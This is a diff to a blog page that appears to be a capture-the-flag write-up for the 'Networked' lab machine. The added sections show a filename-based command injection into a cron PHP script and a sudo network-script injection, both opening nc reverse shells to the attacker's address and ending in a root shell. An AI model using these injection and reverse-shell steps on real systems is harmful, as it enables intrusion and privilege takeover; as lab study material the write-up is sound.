@@ -286,7 +286,7 @@
       <span class="page__meta-readtime">
         <i class="far fa-clock" aria-hidden="true"></i>
         
-          4 minute read
+          6 minute read
         
       </span>
     
@@ -448,6 +448,62 @@ guly:<span class="nv">$6$eKNFoPNC$HlNBvdf0mFXswJ7xRZFaBQgfo0gR626ui</span>/1rydh
 </code></pre></div></div>
 
 <p>And that’s it, we’re now root.</p>
+
+<h1 id="proper-privesc---user">Proper Privesc - User</h1>
+<p>This is the correct/expected way to become root before more vulnerabilites were discovered after this machine was released.</p>
+
+<p>From the apache access, we will discover a script in <code class="language-plaintext highlighter-rouge">/home/guly</code> labled <code class="language-plaintext highlighter-rouge">check_attack.php</code> and a file named <code class="language-plaintext highlighter-rouge">crontab.guly</code> which implies that the <code class="language-plaintext highlighter-rouge">check_attack.php</code> script is executed once every 3 minutes. Looking at the script, we can see that it loops over all files in the directory <code class="language-plaintext highlighter-rouge">/var/www/html/uploads/</code> and if the file is invalid, it will consider it an “attack”, which attempts to remove it with the following line:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec</span><span class="p">(</span><span class="s2">"nohup /bin/rm -f </span><span class="nv">$path$value</span><span class="s2"> &gt; /dev/null 2&gt;&amp;1 &amp;"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>This simply take the filename (as <code class="language-plaintext highlighter-rouge">$value</code>) and passes that on to <code class="language-plaintext highlighter-rouge">exec</code>. The vulnerability here is that we can control the filenames, so if we create a filename that can be injected into this script, it will execute it.</p>
+
+<p>To exploit this, we will create a file that begins with a <code class="language-plaintext highlighter-rouge">;</code> character, which is a command delimiter. Thus the first command will execute (and fail due to the file not existing) and the next command will then execute, in this case it’s our <code class="language-plaintext highlighter-rouge">nc</code> command to send a reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd</span> /var/www/html/uploads
+<span class="nv">$ </span><span class="nb">touch</span> <span class="s1">';nc -c bash 10.10.14.5 8081;'</span>
+</code></pre></div></div>
+
+<p>We are then able to catch the reverse shell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 8081
+listening on <span class="o">[</span>any] 8081 ...
+connect to <span class="o">[</span>10.10.14.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.146] 38476
+</code></pre></div></div>
+
+<h1 id="proper-privesc---root">Proper Privesc - Root</h1>
+<p>As the user, we can see that we’re able to execute a script with sudo</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+User guly may run the following commands on networked:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/sbin/changename.sh
+</code></pre></div></div>
+
+<p>Taking a look at that script, it writes into a network file named <code class="language-plaintext highlighter-rouge">/etc/sysconfig/network-scripts/ifcfg-guly</code>, then attempts to start it. There is a vulnerability in the way RHEL (and thus CentOS) handles this where it will simply source the file as root. When you source the file, you execute everything in the file, <a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f">see here for a description of this</a>. Thus, the way to exploit this is to insert a command into the script that sends a reverse shell back to us as root.</p>
+
+<p>There is a regex match preventing some special characters from being used, most notibly the <code class="language-plaintext highlighter-rouge">.</code> character can’t be used. To bypass this, I created a script that may be executed, then call the script from the file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh"> &gt; /tmp/shell
+&gt; /usr/bin/nc -c 10.10.14.5 8081
+&gt; EOF
+</span><span class="nv">$ </span><span class="sh">chmod a+x /tmp/shell
+</span><span class="nv">$ </span><span class="sh">sudo /usr/local/sbin/changename.sh
+interface NAME:
+/bin/bash /tmp/shell
+interface PROXY_METHOD:
+test
+interface BROWSER_ONLY:
+test
+interface BOOTPROTO:
+test
+</span></code></pre></div></div>
+
+<p>Then set up a listener for the callback.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 8081                                       
+listening on <span class="o">[</span>any] 8081 ...
+connect to <span class="o">[</span>10.10.14.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.146] 43700
+<span class="nb">whoami
+</span>root
+</code></pre></div></div>
+
 
         
       </section>
